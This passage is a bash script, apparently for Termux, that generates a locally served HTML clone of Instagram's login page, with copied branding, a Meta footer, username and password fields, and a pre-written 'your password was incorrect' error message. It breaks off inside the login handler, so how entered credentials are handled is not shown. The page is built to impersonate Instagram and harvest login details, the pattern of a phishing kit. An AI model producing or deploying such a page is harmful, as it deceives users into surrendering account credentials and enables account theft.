#!/bin/bash

# Instagram Login Page - Perfect Clone for Termux
# Serves a locally-hosted page identical to Instagram's login

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}     Instagram Login Page — Termux      ${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

DIR="$HOME/instagram-login"
mkdir -p "$DIR"

# ============================================================
# Generate base64 encoded Instagram wordmark logo PNG
# This is the actual Instagram wordmark text
# ============================================================
# Instagram camera icon + wordmark as SVG embedded in the page

cat > "$DIR/index.html" << 'HTMLEND'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23f58529'/%3E%3Cstop offset='25%25' stop-color='%23f77737'/%3E%3Cstop offset='50%25' stop-color='%23ffdc7d'/%3E%3Cstop offset='75%25' stop-color='%23c42d91'/%3E%3Cstop offset='100%25' stop-color='%23833ab4'/%3E%3C/linearGradient%3E%3Crect x='5' y='5' width='90' height='90' rx='22' fill='url(%23g)'/%3E%3Ccircle cx='50' cy='50' r='22' fill='none' stroke='white' stroke-width='7'/%3E%3Ccircle cx='50' cy='50' r='8' fill='white'/%3E%3Ccircle cx='72' cy='28' r='5' fill='white'/%3E%3C/svg%3E">
    <style>
        /* === RESET === */
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px 0;
        }

        /* === MAIN WRAPPER === */
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 935px;
            padding-bottom: 32px;
            flex-wrap: wrap;
            gap: 0;
        }

        /* === PHONE IMAGE SECTION === */
        .phone-frame {
            flex-basis: 380px;
            flex-shrink: 0;
            display: none;
            justify-content: center;
            align-items: center;
            height: 580px;
            margin-right: 32px;
            position: relative;
        }

        .phone-frame-inner {
            width: 250px;
            height: 540px;
            border-radius: 24px;
            border: 2px solid #dbdbdb;
            background: #fff;
            overflow: hidden;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .phone-screen {
            width: 100%;
            height: 100%;
            background: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .phone-screen .mini-logo {
            width: 80px;
            height: 80px;
            background: radial-gradient(circle at 30% 30%, #f58529, #dd2a7b, #8134af);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .phone-screen .mini-logo::after {
            content: '';
            width: 40px;
            height: 40px;
            border: 3px solid white;
            border-radius: 12px;
            position: absolute;
        }

        .phone-screen .mini-logo-inner {
            width: 18px;
            height: 18px;
            border: 3px solid white;
            border-radius: 50%;
            position: relative;
        }

        .phone-screen .mini-logo-dot {
            width: 6px;
            height: 6px;
            background: white;
            border-radius: 50%;
            position: absolute;
            top: -22px;
            right: -22px;
        }

        .phone-screen .screenshot-img {
            width: 200px;
            height: 400px;
            background: linear-gradient(180deg, #fafafa 0%, #e8e8e8 50%, #dbdbdb 100%);
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #8e8e8e;
            font-size: 12px;
            gap: 8px;
            position: relative;
            overflow: hidden;
        }

        .phone-screen .screenshot-img svg {
            width: 60px;
            height: 60px;
            opacity: 0.3;
        }

        .phone-screen .screenshot-lines {
            display: flex;
            flex-direction: column;
            gap: 6px;
            width: 140px;
        }

        .phone-screen .screenshot-lines span {
            height: 8px;
            background: #dbdbdb;
            border-radius: 4px;
        }

        .phone-screen .screenshot-lines span:nth-child(1) { width: 100%; }
        .phone-screen .screenshot-lines span:nth-child(2) { width: 80%; }
        .phone-screen .screenshot-lines span:nth-child(3) { width: 60%; }

        /* === LOGIN BOX === */
        .login-section {
            max-width: 350px;
            width: 100%;
        }

        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
            text-align: center;
        }

        /* Instagram Wordmark Logo - pure SVG */
        .login-logo {
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-logo svg {
            width: 175px;
            height: 55px;
        }

        /* === FORM === */
        .input-group {
            margin-bottom: 6px;
        }

        .input-group input {
            width: 100%;
            height: 38px;
            padding: 9px 0 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
            outline: none;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
        }

        .input-group input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }

        .login-btn {
            width: 100%;
            height: 32px;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 12px;
            opacity: 0.7;
            pointer-events: none;
            transition: opacity 0.2s;
        }

        .login-btn.active {
            opacity: 1;
            pointer-events: auto;
        }

        .login-btn.active:hover {
            background-color: #1877f2;
        }

        /* === DIVIDER === */
        .divider-row {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider-row::before,
        .divider-row::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-row::before { margin-right: 18px; }
        .divider-row::after  { margin-left: 18px; }

        /* === FACEBOOK BUTTON === */
        .fb-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: none;
            border: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 8px 0;
            width: 100%;
            padding: 6px;
        }

        .fb-btn svg {
            width: 18px;
            height: 18px;
        }

        .fb-btn:hover {
            opacity: 0.8;
        }

        .forgot-link {
            display: block;
            color: #00376b;
            font-size: 12px;
            margin-top: 16px;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* === SIGNUP CARD === */
        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 22px 40px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-card a:hover {
            text-decoration: underline;
        }

        /* === GET APP === */
        .get-app {
            text-align: center;
            margin: 20px 0;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 16px;
            color: #262626;
        }

        .app-badges {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-badges a img {
            height: 40px;
        }

        .badge-placeholder {
            display: inline-block;
            height: 40px;
            border-radius: 4px;
            overflow: hidden;
        }

        .badge-placeholder svg {
            height: 40px;
            width: 134px;
        }

        /* === ERROR === */
        .error-msg {
            color: #ed4956;
            font-size: 13px;
            margin-top: 10px;
            display: none;
            text-align: center;
            line-height: 1.4;
        }

        /* === FOOTER === */
        .footer {
            max-width: 350px;
            width: 100%;
            text-align: center;
            padding: 20px 0;
            color: #8e8e8e;
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 4px 16px;
            margin-bottom: 12px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            font-size: 12px;
            white-space: nowrap;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-bottom {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 16px;
            flex-wrap: wrap;
        }

        .footer-bottom select {
            background: transparent;
            border: none;
            color: #8e8e8e;
            font-size: 12px;
            outline: none;
            cursor: pointer;
        }

        /* === RESPONSIVE === */
        @media (min-width: 876px) {
            .phone-frame { display: flex; }
        }

        @media (max-width: 450px) {
            body { background: #fff; }
            .login-card {
                border: none;
                background: transparent;
                padding: 20px;
            }
            .signup-card {
                border: none;
                background: transparent;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- === PHONE MOCKUP === -->
        <div class="phone-frame">
            <div class="phone-frame-inner">
                <div class="phone-screen">
                    <!-- Instagram app icon inside phone -->
                    <svg width="80" height="80" viewBox="0 0 80 80" style="margin-bottom:24px;">
                        <defs>
                            <linearGradient id="igGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                                <stop offset="0%" stop-color="#f58529"/>
                                <stop offset="25%" stop-color="#f77737"/>
                                <stop offset="50%" stop-color="#ffdc7d"/>
                                <stop offset="75%" stop-color="#c42d91"/>
                                <stop offset="100%" stop-color="#833ab4"/>
                            </linearGradient>
                        </defs>
                        <rect x="4" y="4" width="72" height="72" rx="18" fill="url(#igGrad)"/>
                        <circle cx="40" cy="40" r="18" fill="none" stroke="#fff" stroke-width="5"/>
                        <circle cx="40" cy="40" r="6" fill="#fff"/>
                        <circle cx="58" cy="22" r="4.5" fill="#fff"/>
                    </svg>
                    <!-- Fake posts -->
                    <div style="width:180px;display:flex;flex-direction:column;gap:10px;">
                        <div style="display:flex;align-items:center;gap:8px;">
                            <div style="width:28px;height:28px;border-radius:50%;background:linear-gradient(45deg,#f58529,#dd2a7b);display:flex;align-items:center;justify-content:center;">
                                <div style="width:24px;height:24px;border-radius:50%;background:#fafafa;"></div>
                            </div>
                            <div style="width:80px;height:8px;background:#dbdbdb;border-radius:4px;"></div>
                        </div>
                        <div style="width:100%;height:140px;background:#dbdbdb;border-radius:4px;"></div>
                        <div style="display:flex;gap:4px;">
                            <div style="width:12px;height:12px;border-radius:50%;background:#dbdbdb;"></div>
                            <div style="width:12px;height:12px;border-radius:50%;background:#dbdbdb;"></div>
                            <div style="width:12px;height:12px;border-radius:50%;background:#dbdbdb;"></div>
                        </div>
                        <div style="width:100px;height:6px;background:#dbdbdb;border-radius:3px;"></div>
                        <div style="width:140px;height:6px;background:#dbdbdb;border-radius:3px;"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- === LOGIN FORM === -->
        <div class="login-section">
            <div class="login-card">
                <!-- Instagram Wordmark Logo -->
                <div class="login-logo">
                    <svg viewBox="0 0 175 55" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <!-- Camera icon -->
                        <rect x="2" y="12" width="28" height="28" rx="7" stroke="#262626" stroke-width="2.5" fill="none"/>
                        <circle cx="16" cy="26" r="8" stroke="#262626" stroke-width="2.5" fill="none"/>
                        <circle cx="26" cy="18" r="2.5" fill="#262626"/>
                        <rect x="10" y="22" width="12" height="12" rx="6" fill="none" stroke="#262626" stroke-width="1.5"/>
                        <!-- Wordmark "Instagram" -->
                        <text x="38" y="34" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="28" font-weight="400" fill="#262626" letter-spacing="1.2">Instagram</text>
                    </svg>
                </div>

                <form id="loginForm" onsubmit="return handleLogin(event)">
                    <div class="input-group">
                        <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off" required>
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="login-btn" id="loginBtn">Log in</button>
                </form>

                <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>

                <div class="divider-row">OR</div>

                <button class="fb-btn" type="button">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="#385185">
                        <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
                    </svg>
                    Log in with Facebook
                </button>

                <a href="#" class="forgot-link">Forgot password?</a>
            </div>

            <div class="signup-card">
                Don't have an account? <a href="#">Sign up</a>
            </div>

            <div class="get-app">
                <p>Get the app.</p>
                <div class="app-badges">
                    <a href="#" class="badge-placeholder">
                        <svg viewBox="0 0 134 40">
                            <rect width="134" height="40" rx="4" fill="#000"/>
                            <text x="14" y="26" fill="#fff" font-family="Arial,sans-serif" font-size="11" font-weight="bold">Google Play</text>
                        </svg>
                    </a>
                    <a href="#" class="badge-placeholder">
                        <svg viewBox="0 0 134 40">
                            <rect width="134" height="40" rx="4" fill="#000"/>
                            <text x="18" y="26" fill="#fff" font-family="Arial,sans-serif" font-size="11" font-weight="bold">App Store</text>
                        </svg>
                    </a>
                </div>
            </div>

            <!-- Footer -->
            <div class="footer">
                <div class="footer-links">
                    <a href="#">Meta</a>
                    <a href="#">About</a>
                    <a href="#">Blog</a>
                    <a href="#">Jobs</a>
                    <a href="#">Help</a>
                    <a href="#">API</a>
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                    <a href="#">Locations</a>
                    <a href="#">Instagram Lite</a>
                    <a href="#">Threads</a>
                    <a href="#">Contact Uploading &amp; Non-Users</a>
                    <a href="#">Meta Verified</a>
                </div>
                <div class="footer-bottom">
                    <select>
                        <option>English</option>
                        <option>Español</option>
                        <option>Français</option>
                        <option>العربية</option>
                    </select>
                    <span>&copy; 2026 Instagram from Meta</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        const username = document.getElementById('username');
        const password = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const errorMsg = document.getElementById('errorMsg');
        const form = document.getElementById('loginForm');

        function checkFields() {
            if (username.value.trim() !== '' && password.value.trim() !== '') {
                loginBtn.classList.add('active');
            } else {
                loginBtn.classList.remove('active');
            }
        }

        username.addEventListener('input', checkFields);
        password.addEventListener('input', checkFields);

        function handleLogin(e) {
  
